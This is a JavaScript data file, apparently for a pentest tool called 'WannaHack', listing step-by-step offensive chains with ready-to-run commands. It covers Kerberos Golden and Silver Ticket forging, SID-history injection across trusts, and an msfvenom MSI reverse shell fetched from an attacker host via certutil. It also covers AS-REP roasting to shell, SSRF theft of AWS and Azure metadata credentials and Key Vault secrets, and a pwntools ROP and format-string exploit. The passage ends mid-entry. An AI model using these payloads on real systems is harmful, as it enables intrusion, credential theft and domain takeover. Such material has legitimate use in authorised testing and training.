// WannaHack - Chain Database
// AUTO-GENERATED — do not edit manually.
// To add or modify chains, edit the YAML files in the chains/ directory.
// Then run: node build-chains.js

const CHAIN_DATA = {
  "chains": [
    {
      "id": "ad-persistence-golden-ticket",
      "name": "AD Persistence — Golden Ticket (krbtgt-signed)",
      "description": "Post-DA: extract the krbtgt NT hash, forge TGTs as any user for any service. The ticket is valid until krbtgt is reset TWICE (the rotation keeps the old key valid for one cycle). Long-term persistence.\n",
      "tags": [
        "persistence",
        "golden-ticket",
        "kerberos",
        "post-da",
        "active-directory"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "domain_sid",
          "description": "S-1-5-21-... domain SID.",
          "required": true
        },
        {
          "name": "krbtgt_nt_hash",
          "description": "NT hash of the krbtgt account (from DCSync).",
          "required": true
        },
        {
          "name": "impersonate_user",
          "description": "User to forge a TGT for (typically Administrator)."
        }
      ],
      "steps": [
        {
          "id": "get_domain_sid",
          "name": "Look up the domain SID if you don't have it",
          "inline_command": "impacket-lookupsid '<domain>/anonymous'@<dc-ip> 0 | head -5",
          "notes": "Or from a Pwn3d! host: `whoami /user` shows your SID; strip the\nlast RID for the domain SID. Or from BloodHound's domain node.\n"
        },
        {
          "id": "forge_ticket",
          "name": "Forge the Golden Ticket",
          "inline_command": "impacket-ticketer \\\n  -nthash '<krbtgt_hash>' \\\n  -domain-sid '<sid>' \\\n  -domain '<domain>' \\\n  <user>\n",
          "inputs": {
            "krbtgt_hash": "${krbtgt_nt_hash}",
            "sid": "${domain_sid}",
            "domain": "${domain}",
            "user": "${impersonate_user}"
          },
          "notes": "Creates `<user>.ccache` in the cwd. Default lifetime is 10 years —\ntune with `-duration`. For lateral discretion, match real ticket\nduration (10 hours).\n",
          "capture": [
            {
              "var": "golden_ccache",
              "regex": "Saving ticket in (\\S+\\.ccache)",
              "match": "first"
            }
          ]
        },
        {
          "id": "use_ticket",
          "name": "Use the ticket",
          "inline_command": "export KRB5CCNAME=<ccache>\n# Verify:\nklist\n# DCSync with the new identity:\nimpacket-secretsdump -k -no-pass '<domain>/<user>@<dc-fqdn>'\n# Or shell:\nimpacket-psexec -k -no-pass '<domain>/<user>@<dc-fqdn>'\n",
          "inputs": {
            "ccache": "${golden_ccache}",
            "domain": "${domain}",
            "user": "${impersonate_user}"
          },
          "notes": "Many CTF/lab setups expect FQDN, not IP, when using Kerberos\n(PKINIT/encryption depends on the SPN matching the host name).\nAdd the DC to /etc/hosts if needed: `<dc-ip> <domain> dc.<domain>`.\n"
        },
        {
          "id": "silver_ticket_alt",
          "name": "Or: Silver Ticket (single-service, even stealthier)",
          "inline_command": "impacket-ticketer \\\n  -nthash '<service_account_nt_hash>' \\\n  -domain-sid '<sid>' \\\n  -domain '<domain>' \\\n  -spn 'cifs/<target>.<domain>' \\\n  <user>\n",
          "inputs": {
            "sid": "${domain_sid}",
            "domain": "${domain}",
            "user": "${impersonate_user}"
          },
          "notes": "Silver Ticket = TGS for a specific service signed with the service\naccount's hash (e.g. MSSQLSvc, cifs, http). No DC interaction at all,\nbypasses krbtgt rotation, but only works for that single SPN.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — Golden Ticket",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html"
        },
        {
          "title": "The Hacker Recipes — Golden Ticket",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets"
        }
      ]
    },
    {
      "id": "ad-trust-enumeration",
      "name": "AD — Trust enumeration + cross-domain pivot prep",
      "description": "Once you have a domain foothold, map every trust (parent/child, external, forest). Cross-forest paths are often weakly defended and offer the only route from a child domain to the forest root.\n",
      "tags": [
        "recon",
        "trusts",
        "active-directory",
        "cross-forest",
        "enumeration"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "enum_trusts_ldap",
          "name": "Trusts via LDAP",
          "command_ref": "nxc-ldap-enum-trusts",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Important columns:\n - `TrustType` (Forest, Domain, MIT) — Forest trusts cross trees.\n - `TrustDirection` (Inbound, Outbound, Bidirectional).\n - `TrustAttribute` (FOREST_TRANSITIVE, FILTER_SIDS, etc.) — `FILTER_SIDS`\n   being ABSENT (i.e. SID filtering disabled) is the green light for\n   SID-history injection.\n",
          "capture": [
            {
              "var": "trust_targets",
              "regex": "\\[\\+\\][^\\n]*Trust\\s+(?:to|with)\\s+([A-Za-z0-9.-]+)",
              "match": "all"
            }
          ]
        },
        {
          "id": "bloodhound_trusts",
          "name": "Visualize trusts in BloodHound",
          "inline_command": "echo 'In BloodHound: MATCH p=(:Domain)-[r:TrustedBy*1..3]->(:Domain) RETURN p — shows every trust edge as an interactive graph.'",
          "notes": "The `Domain` nodes have edges of type TrustedBy / SameForestTrust.\nLook for paths from your foothold domain to others.\n"
        },
        {
          "id": "dns_lookup",
          "name": "DNS-resolve every trusted domain to find DCs",
          "inline_command": "for d in <trust_targets>; do\n  echo \"=== $d ===\"\n  nslookup -type=SRV _ldap._tcp.dc._msdcs.$d <dc-ip>\ndone\n",
          "inputs": {
            "dc-ip": "${dc_ip}"
          },
          "notes": "The SRV record returns FQDN+port of every DC in the trusted domain.\nAdd them to /etc/hosts so Kerberos works (PKINIT needs the SPN).\n"
        },
        {
          "id": "child_to_parent_sid_history",
          "name": "Child→parent: SID history injection (if you own child DA)",
          "inline_command": "# Get the Enterprise Admins SID via the parent's domain SID + RID 519:\n# impacket-lookupsid '<child_domain>/<user>:<password>'@<child_dc> 0\nimpacket-ticketer \\\n  -nthash '<krbtgt_nt_hash>' \\\n  -domain-sid '<child_domain_sid>' \\\n  -domain '<child_domain>' \\\n  -extra-sid '<parent_domain_sid>-519' \\\n  Administrator\n",
          "notes": "Forges a Golden Ticket in the child with an Enterprise Admins SID in\nthe SID history → ticket is accepted by parent DCs because SID\nfiltering is off by default INSIDE a forest. From there: DCSync the\nparent.\n"
        },
        {
          "id": "forest_trust_external",
          "name": "External forest trust → look for SID filter quirks",
          "inline_command": "# Investigate FILTER_SIDS quarantine flag — if cleared on an external trust, SID-history works cross-forest too. Rare but devastating when present."
        }
      ],
      "references": [
        {
          "title": "HackTricks — Domain Trusts",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/domain-trusts.html"
        },
        {
          "title": "SpecterOps — Inter-forest TrustedBy",
          "url": "https://posts.specterops.io/forest-trust-the-things-you-thought-you-knew-23afe6d40c0c"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "cross-forest paths open up",
          "reason": "Combine with Golden Ticket + SID history for cross-domain takeover."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "reached new domain",
          "reason": "Spread the new identity in the trusted domain."
        }
      ]
    },
    {
      "id": "alwaysinstallelevated",
      "name": "Windows PE — AlwaysInstallElevated → MSI to SYSTEM",
      "description": "When both HKLM\\\\...\\\\Installer\\\\AlwaysInstallElevated and the matching HKCU key are 1, any user can install MSI packages elevated. msfvenom builds the payload in seconds.\n",
      "tags": [
        "windows",
        "priv-esc",
        "msi",
        "classic-windows"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "check_registry",
          "name": "Confirm AlwaysInstallElevated = 1 in HKLM + HKCU",
          "inline_command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n",
          "notes": "BOTH must return `REG_DWORD 0x1`. If only one is set, this won't work.\n"
        },
        {
          "id": "craft_msi",
          "name": "Craft the MSI payload (attacker box)",
          "inline_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o /tmp/install.msi",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          }
        },
        {
          "id": "transfer",
          "name": "Transfer to target (any method)",
          "inline_command": "# attacker: python3 -m http.server 80\n# victim: certutil -urlcache -f http://<lhost>/install.msi C:\\Windows\\Temp\\install.msi",
          "inputs": {
            "lhost": "${attacker_ip}"
          }
        },
        {
          "id": "install",
          "name": "Trigger msiexec /quiet",
          "inline_command": "msiexec /quiet /qn /i C:\\Windows\\Temp\\install.msi",
          "notes": "`/quiet /qn` suppresses UI. No need for elevation prompts thanks to\nthe policy. Reverse shell comes back as SYSTEM.\n"
        },
        {
          "id": "confirm",
          "name": "Catch the reverse shell",
          "inline_command": "nc -lvnp <lport>; # then `whoami` → nt authority\\system",
          "inputs": {
            "lport": "4444"
          }
        }
      ],
      "references": [
        {
          "title": "HackTricks — AlwaysInstallElevated",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "reason": "SYSTEM shell — loot the box."
        }
      ]
    },
    {
      "id": "asrep-to-shell",
      "name": "AS-REP Roast → Crack → Evil-WinRM",
      "description": "Discover Active Directory accounts that have Kerberos pre-auth disabled, harvest their AS-REP responses, crack them offline, and use the recovered password to open an Evil-WinRM shell on the Domain Controller.\n",
      "tags": [
        "kerberos",
        "asreproast",
        "credential-attack",
        "lateral-movement",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "description": "Domain Controller IP.",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "description": "Active Directory domain (e.g. corp.local).",
          "source": "target_context.domain",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "enum_asrep_users",
          "name": "Find AS-REP-roastable users",
          "command_ref": "nxc-ldap-asreproasting",
          "notes": "Unauthenticated variant requires a users.txt wordlist. With any valid\nLDAP-readable credential (even a low-priv account) the call returns\nevery account with DONT_REQ_PREAUTH set.\n",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "output.txt": "asrep.hashes"
          },
          "capture": [
            {
              "var": "asrep_hashes",
              "regex": "\\$krb5asrep\\$.+",
              "match": "all"
            },
            {
              "var": "roastable_users",
              "regex": "\\$krb5asrep\\$[0-9]+\\$([A-Za-z0-9._-]+)@",
              "match": "all"
            }
          ]
        },
        {
          "id": "crack_asrep",
          "name": "Crack AS-REP hashes offline",
          "command_ref": "hashcat-asrep",
          "requires": [
            "asrep_hashes"
          ],
          "inputs": {
            "hash_file": "asrep.hashes"
          },
          "capture": [
            {
              "var": "cracked_creds",
              "regex": "^(\\$krb5asrep\\$[^:]+):(.+)$",
              "match": "all",
              "groups": {
                "hash": 1,
                "password": 2
              }
            }
          ]
        },
        {
          "id": "get_shell",
          "name": "Authenticate with the cracked password",
          "command_ref": "evil-winrm",
          "requires": [
            "cracked_creds"
          ],
          "notes": "The runner shows the Evil-WinRM card with its built-in variations\n(password / NTLM hash / Kerberos ticket). Pick the one matching what\nyou cracked. Most often this is the password path.\n"
        }
      ],
      "references": [
        {
          "title": "AS-REP Roasting — The Hacker Recipes",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
        },
        {
          "title": "Evil-WinRM",
          "url": "https://github.com/Hackplayers/evil-winrm"
        }
      ],
      "next_chains": [
        {
          "chain": "pth-lateral-spread",
          "when": "cracked password gives admin somewhere",
          "reason": "Spread the freshly-cracked credential."
        },
        {
          "chain": "dpapi-secrets-extraction",
          "when": "local admin on the host",
          "reason": "Loot every saved cred via DPAPI."
        },
        {
          "chain": "windows-priv-esc-recon",
          "when": "low-priv evil-winrm shell",
          "reason": "If not Administrator, enumerate for privesc."
        }
      ]
    },
    {
      "id": "aws-imds-ssrf",
      "name": "Cloud — SSRF → AWS IMDS → IAM role credentials",
      "description": "Server-Side Request Forgery on an EC2-hosted app gives you HTTP access from inside the VPC. Hit the Instance Metadata Service (169.254.169.254) to enumerate the instance role and steal its temporary AWS credentials. IMDSv1 = free creds. IMDSv2 = one extra step.\n",
      "tags": [
        "cloud",
        "aws",
        "ssrf",
        "imds",
        "post-exploitation"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "ssrf_url",
          "description": "Vulnerable URL that fetches arbitrary URLs (e.g. http://target/preview?url=)",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_ssrf",
          "name": "Confirm SSRF reaches internal IPs",
          "inline_command": "curl '<url>http://169.254.169.254/'",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "notes": "Should return some response (200 with the IMDS index, or 404, or\na connection-refused error if not on AWS). Anything but a generic\ntimeout is good news.\n"
        },
        {
          "id": "detect_imds_version",
          "name": "Detect IMDSv1 vs IMDSv2",
          "inline_command": "curl '<url>http://169.254.169.254/latest/meta-data/'",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "notes": "IMDSv1 returns the metadata index directly. IMDSv2 returns 401\n\"Unauthorized\" — you need a token first.\n"
        },
        {
          "id": "imdsv2_token",
          "name": "Get IMDSv2 session token (skip on v1)",
          "inline_command": "# Need SSRF that supports PUT + custom header; many do via param tricks:\ncurl -X PUT '<url>http://169.254.169.254/latest/api/token' \\\n  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'\n",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "notes": "If SSRF only supports GET → you're stuck (this is exactly why IMDSv2\nexists). Some apps proxy custom headers — check for `headers=` query\nparams or templated header forwarding.\n",
          "capture": [
            {
              "var": "imds_token",
              "regex": "([A-Za-z0-9+/=]{40,})",
              "match": "first"
            }
          ]
        },
        {
          "id": "list_roles",
          "name": "Enumerate the IAM role attached to the instance",
          "inline_command": "# v1:\ncurl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# v2 (use token from previous step):\ncurl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/' \\\n  -H 'X-aws-ec2-metadata-token: <token>'\n",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "capture": [
            {
              "var": "aws_role_name",
              "regex": "^([A-Za-z0-9_.-]+)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "steal_credentials",
          "name": "Steal AccessKey + SecretKey + SessionToken",
          "inline_command": "curl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'\n",
          "inputs": {
            "url": "${ssrf_url}",
            "role": "${aws_role_name}"
          },
          "notes": "Response JSON has AccessKeyId, SecretAccessKey, Token, Expiration.\nToken lasts ~1-6 hours — race against the clock.\n",
          "capture": [
            {
              "var": "aws_access_key",
              "regex": "\"AccessKeyId\"\\s*:\\s*\"([A-Z0-9]+)\"",
              "match": "first"
            },
            {
              "var": "aws_secret_key",
              "regex": "\"SecretAccessKey\"\\s*:\\s*\"([A-Za-z0-9/+=]+)\"",
              "match": "first"
            },
            {
              "var": "aws_session_token",
              "regex": "\"Token\"\\s*:\\s*\"([A-Za-z0-9/+=]+)\"",
              "match": "first"
            }
          ]
        },
        {
          "id": "enumerate_aws",
          "name": "Use the credentials with AWS CLI",
          "inline_command": "export AWS_ACCESS_KEY_ID='<key>'\nexport AWS_SECRET_ACCESS_KEY='<secret>'\nexport AWS_SESSION_TOKEN='<token>'\naws sts get-caller-identity\naws s3 ls\naws iam list-attached-role-policies --role-name '<role>'\n",
          "inputs": {
            "key": "${aws_access_key}",
            "secret": "${aws_secret_key}",
            "token": "${aws_session_token}",
            "role": "${aws_role_name}"
          },
          "notes": "With creds in hand: list S3 buckets, enumerate IAM, pacu/ScoutSuite\nthe account. The role often has more rights than just app-level\naccess (over-provisioned by default).\n"
        }
      ],
      "references": [
        {
          "title": "AWS IMDS docs",
          "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"
        },
        {
          "title": "HackTricks — AWS SSRF",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "AWS shell via SSM (rare)",
          "reason": "If you escalated via SSM, stabilize."
        }
      ]
    },
    {
      "id": "azure-imds-managed-identity",
      "name": "Cloud — Azure IMDS → managed identity → token",
      "description": "SSRF on an Azure VM/AKS/App Service hits 169.254.169.254 to extract the managed identity's OAuth2 token. Token grants Azure AD-scoped access for whatever role is bound to that identity (often Contributor on the RG).\n",
      "tags": [
        "cloud",
        "azure",
        "ssrf",
        "imds",
        "managed-identity",
        "post-exploitation"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "ssrf_url",
          "description": "Vulnerable URL that fetches arbitrary URLs.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_azure",
          "name": "Confirm we're on Azure (compute metadata)",
          "inline_command": "curl '<url>http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true'",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "notes": "Azure IMDS REQUIRES the literal `Metadata: true` header (anti-SSRF\nmitigation). If your SSRF can't add headers — you're stuck unless\nit's a `headers=` parameter trick.\n",
          "capture": [
            {
              "var": "azure_subscription_id",
              "regex": "\"subscriptionId\"\\s*:\\s*\"([0-9a-f-]+)\"",
              "match": "first"
            },
            {
              "var": "azure_vm_name",
              "regex": "\"name\"\\s*:\\s*\"([^\"]+)\"",
              "match": "first"
            }
          ]
        },
        {
          "id": "get_token_for_arm",
          "name": "Request OAuth token for Azure Resource Manager",
          "inline_command": "curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \\\n  -H 'Metadata: true'\n",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "capture": [
            {
              "var": "azure_arm_token",
              "regex": "\"access_token\"\\s*:\\s*\"([^\"]+)\"",
              "match": "first"
            }
          ]
        },
        {
          "id": "get_token_for_graph",
          "name": "Also grab a Graph token (Azure AD operations)",
          "inline_command": "curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' \\\n  -H 'Metadata: true'\n",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "capture": [
            {
              "var": "azure_graph_token",
              "regex": "\"access_token\"\\s*:\\s*\"([^\"]+)\"",
              "match": "first"
            }
          ]
        },
        {
          "id": "get_token_for_keyvault",
          "name": "Token for Key Vault — gold mine if the identity has access",
          "inline_command": "curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' \\\n  -H 'Metadata: true'\n",
          "inputs": {
            "url": "${ssrf_url}"
          }
        },
        {
          "id": "enumerate_via_arm",
          "name": "Use the ARM token from your laptop",
          "inline_command": "export AZ_TOKEN='<token>'\ncurl -H \"Authorization: Bearer $AZ_TOKEN\" \\\n  \"https://management.azure.com/subscriptions/<sub>/resourcegroups?api-version=2021-04-01\"\n# Or via az CLI:\naz login --service-principal -u <client-id> -p $AZ_TOKEN --tenant <tenant>  # if managed identity gives one\naz role assignment list --assignee <object-id>\n",
          "inputs": {
            "token": "${azure_arm_token}",
            "sub": "${azure_subscription_id}"
          }
        },
        {
          "id": "pillage_keyvault",
          "name": "Pillage Key Vault secrets (if token granted)",
          "inline_command": "VAULT_TOKEN='<kv_token>'\n# List vaults the identity can reach (via ARM token):\ncurl -H \"Authorization: Bearer $AZ_TOKEN\" \\\n  \"https://management.azure.com/subscriptions/<sub>/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01\"\n# Per vault, list secrets:\ncurl -H \"Authorization: Bearer $VAULT_TOKEN\" \\\n  \"https://<vaultname>.vault.azure.net/secrets?api-version=7.4\"\n# Per secret, read value:\ncurl -H \"Authorization: Bearer $VAULT_TOKEN\" \\\n  \"https://<vaultname>.vault.azure.net/secrets/<name>?api-version=7.4\"\n"
        }
      ],
      "references": [
        {
          "title": "Azure IMDS docs",
          "url": "https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service"
        },
        {
          "title": "HackTricks — Azure SSRF",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"
        }
      ],
      "next_chains": [
        {
          "chain": "aws-imds-ssrf",
          "when": "multi-cloud target",
          "reason": "Same SSRF often reaches AWS metadata too."
        }
      ]
    },
    {
      "id": "bloodhound-cypher-collection",
      "name": "AD — BloodHound Cypher query collection",
      "description": "Not a chain you run linearly — a curated set of Cypher one-liners to paste into BloodHound (CE or legacy) once you've ingested data. Each query exposes a different attack primitive.\n",
      "tags": [
        "bloodhound",
        "cypher",
        "active-directory",
        "recon"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "shortest_path_to_da",
          "name": "Classic: shortest path from owned to Domain Admins",
          "inline_command": "MATCH (n {owned: true}),(g:Group),\n      p = shortestPath((n)-[*1..]->(g))\nWHERE g.name STARTS WITH 'DOMAIN ADMINS'\nRETURN p\n"
        },
        {
          "id": "asrep_kerberoast",
          "name": "AS-REP-roastable + Kerberoastable",
          "inline_command": "MATCH (u:User {dontreqpreauth: true}) RETURN u\nMATCH (u:User {hasspn: true}) RETURN u\n"
        },
        {
          "id": "dcsync_holders",
          "name": "Anyone with DCSync rights",
          "inline_command": "MATCH p=(n)-[r:GetChangesAll|GetChanges|GetChangesInFilteredSet]->(d:Domain)\nRETURN p\n"
        },
        {
          "id": "unconstrained_delegation",
          "name": "Unconstrained-delegation hosts",
          "inline_command": "MATCH (c:Computer {unconstraineddelegation: true}) RETURN c\n"
        },
        {
          "id": "rbcd_writable",
          "name": "Where you can write RBCD (computer takeover candidates)",
          "inline_command": "MATCH p=(n {owned: true})-[r:AddAllowedToAct|WriteAccountRestrictions|GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer)\nRETURN p\n"
        },
        {
          "id": "shadow_credentials_paths",
          "name": "Where you can add KeyCredentialLink (Shadow Credentials)",
          "inline_command": "MATCH p=(n {owned: true})-[r:AddKeyCredentialLink|GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights]->(t)\nWHERE t:User OR t:Computer\nRETURN p\n"
        },
        {
          "id": "gpo_abuse",
          "name": "GPO write rights → push payload to every linked host",
          "inline_command": "MATCH p=(n {owned: true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO)\nRETURN p\n// Then: MATCH (g:GPO {name:'<name>'})-[:GpLink]->(ou) RETURN ou — see what's linked.\n"
        },
        {
          "id": "high_value_in_easy_reach",
          "name": "HighValue targets within 3 hops of any owned principal",
          "inline_command": "MATCH (n {owned: true}),(h {highvalue: true}),\n      p = shortestPath((n)-[*1..3]->(h))\nRETURN p\n"
        },
        {
          "id": "kerberos_double_hop",
          "name": "Computers with unconstrained delegation pointing at HVT services",
          "inline_command": "MATCH (c:Computer {unconstraineddelegation: true})-[:HasSession]->(u:User)\nWHERE u.admincount = true\nRETURN c, u\n"
        },
        {
          "id": "machine_accounts_as_admin",
          "name": "Machine accounts that are local admins on other computers",
          "inline_command": "MATCH p=(c1:Computer)-[r:AdminTo|MemberOf*1..]->(c2:Computer)\nWHERE c1 <> c2\nRETURN p LIMIT 50\n"
        },
        {
          "id": "foreign_group_membership",
          "name": "Cross-domain group memberships (cross-forest pivot)",
          "inline_command": "MATCH (u:User)-[r:MemberOf]->(g:Group)\nWHERE NOT u.domain = g.domain\nRETURN u.name, g.name, g.domain\n"
        }
      ],
      "references": [
        {
          "title": "BloodHound docs",
          "url": "https://bloodhound.specterops.io/"
        },
        {
          "title": "CompassSecurity Cypher cheatsheet",
          "url": "https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-1/"
        }
      ],
      "next_chains": [
        {
          "chain": "dacl-genericall-abuse",
          "when": "GenericAll path found",
          "reason": "Cash in the DACL primitive."
        },
        {
          "chain": "shadow-credentials",
          "when": "AddKeyCredentialLink path found",
          "reason": "Silent takeover."
        },
        {
          "chain": "rbcd-takeover",
          "when": "RBCD-writable computer found",
          "reason": "Take over the computer via RBCD."
        },
        {
          "chain": "kerberoast-chain",
          "when": "hasspn=true users surfaced",
          "reason": "Kerberoast the new candidates."
        }
      ]
    },
    {
      "id": "bof-modern-exploitation",
      "name": "Binary — modern stack BOF / format string / ROP basics",
      "description": "Walk through the binary exploitation playbook on a Linux x64 CTF challenge: identify the bug, leak ASLR, build a ROP chain, drop a shell. Covers the OSCP-style modern BOF.\n",
      "tags": [
        "binary-exploitation",
        "bof",
        "rop",
        "format-string",
        "oscp",
        "ctf"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "binary_path",
          "description": "Path to the vulnerable binary.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "triage",
          "name": "Triage — file, checksec, libc version",
          "inline_command": "file <bin>\nchecksec --file=<bin>\nldd <bin>\nstrings <bin> | grep -i 'libc\\|gets\\|printf\\|system'\n",
          "inputs": {
            "bin": "${binary_path}"
          },
          "notes": "checksec output decides the strategy:\n  NX off              → shellcode on stack\n  NX on + PIE off     → ret2plt, ret2libc\n  NX on + PIE on      → leak first (format string / partial overwrite)\n  Canary on           → leak canary (FS / forked child) before overflow\n  Full RELRO          → can't overwrite GOT\n"
        },
        {
          "id": "fuzz_overflow",
          "name": "Find the bug + offset",
          "inline_command": "# Generate pattern:\npwn cyclic 256\n# Run binary with it, look at the crash:\ngdb-pwndbg -q <bin>\n(gdb) r < <(pwn cyclic 256)\n(gdb) i r rsp\n# Then:\npwn cyclic -l 0xCRASHEDVALUE\n# → exact offset to RIP control.\n",
          "inputs": {
            "bin": "${binary_path}"
          }
        },
        {
          "id": "leak_libc",
          "name": "Leak libc with puts(GOT_puts) → resolve base",
          "inline_command": "python3 -c '\nfrom pwn import *\ne = ELF(\"<bin>\")\nr = process(\"<bin>\")\npayload = b\"A\"*<OFFSET> + p64(e.plt[\"puts\"]) + p64(e.symbols[\"main\"]) + p64(e.got[\"puts\"])\nr.sendline(payload)\nleaked = u64(r.recv(6).ljust(8, b\"\\\\x00\"))\nlibc_base = leaked - libc.symbols[\"puts\"]\nprint(hex(libc_base))'\n",
          "inputs": {
            "bin": "${binary_path}"
          },
          "notes": "Calls puts(puts@GOT) — the address of libc puts gets printed.\nSubtract libc's puts offset → libc base. Now you can call anything\nin libc.\n"
        },
        {
          "id": "rop_to_shell",
          "name": "Build the ROP chain → system(\"/bin/sh\")",
          "inline_command": "python3 -c '\nfrom pwn import *\ne = ELF(\"<bin>\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nlibc.address = <LEAKED_BASE>\nr = process(\"<bin>\")\npop_rdi = <GADGET_FROM_ROPGADGET>\nret = <RET_GADGET>\npayload = b\"A\"*<OFFSET> + p64(pop_rdi) + p64(next(libc.search(b\"/bin/sh\"))) + p64(ret) + p64(libc.symbols[\"system\"])\nr.sendline(payload)\nr.interactive()'\n",
          "inputs": {
            "bin": "${binary_path}"
          },
          "notes": "Use ROPgadget --binary <bin> to find pop rdi ; ret. Add a single\nret to align the stack (System V ABI requires 16-byte alignment\nbefore the call instruction).\n"
        },
        {
          "id": "format_string",
          "name": "Format string — leak + arbitrary write",
          "inline_command": "# Leak addresses by feeding %p%p%p%p%p... to the vulnerable printf.\npython3 -c 'print(\"AAAA%7\\$p\")' | nc <host> <port>\n# If position 7 leaks back \"0x4141414141414141\" → that's your write slot.\n# Then arbitrary write:\npython3 -c 'print((\"\\\\xaa\\\\xaa\\\\xaa\\\\xaa\\\\xaa\\\\xaa%4444c%7\\\\$hn\"))'\n# Overwrites the address held in slot 7 with the value 4444.\n",
          "notes": "Often used to overwrite a GOT entry → next call goes to your gadget.\n"
        },
        {
          "id": "spawn_shell",
          "name": "Confirm shell",
          "inline_command": "id"
        }
      ],
      "references": [
        {
          "title": "pwntools",
          "url": "https://docs.pwntools.com/en/stable/"
        },
        {
          "title": "How2Heap (heap basics)",
          "url": "https://github.com/shellphish/how2heap"
        },
        {
          "title": "ropemporium (ROP practice)",
          "url": "https://ropemporium.com/"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "reverse shell received",
          "reason": "Stabilize the popped shell."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "shell as a low-priv user",
          "reason": "Escalate from the binary user."
        }
      ]
    },
    {
      "id": "cache-deception-poisoning",
      "name": "Web — Web cache deception + cache poisoning",
      "description": "Two related attack families against CDNs / reverse proxies: - Cache DECEPTION: trick the cache into storing authenticated pages\n  under a path the attacker can fetch publicly.\n- Cache POISONING: inject malicious content into a cache entry that\n  everyone else then receives.\n",
      "tags": [
        "web",
        "cache",
        "cdn",
        "deception",
        "poisoning"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "App fronted by a CDN / cache (CloudFlare, Akamai, Varnish, etc.).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "identify_cache",
          "name": "Confirm there's a cache + how it differentiates",
          "inline_command": "curl -I '<url>'  # Look for: Age, X-Cache, CF-Cache-Status, Via headers\ncurl -I '<url>?xy=1'  # check if query string is part of cache key\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Indicators of a cache:\n  X-Cache: HIT/MISS\n  CF-Cache-Status: HIT/MISS/DYNAMIC\n  Age: <seconds>\n  Via: 1.1 varnish\nCache key elements you can probe: Host, path, query string, specific\nheaders (Accept-Language, X-Forwarded-Host).\n"
        },
        {
          "id": "cache_deception_static_suffix",
          "name": "Cache deception: append /attacker.css to authenticated URL",
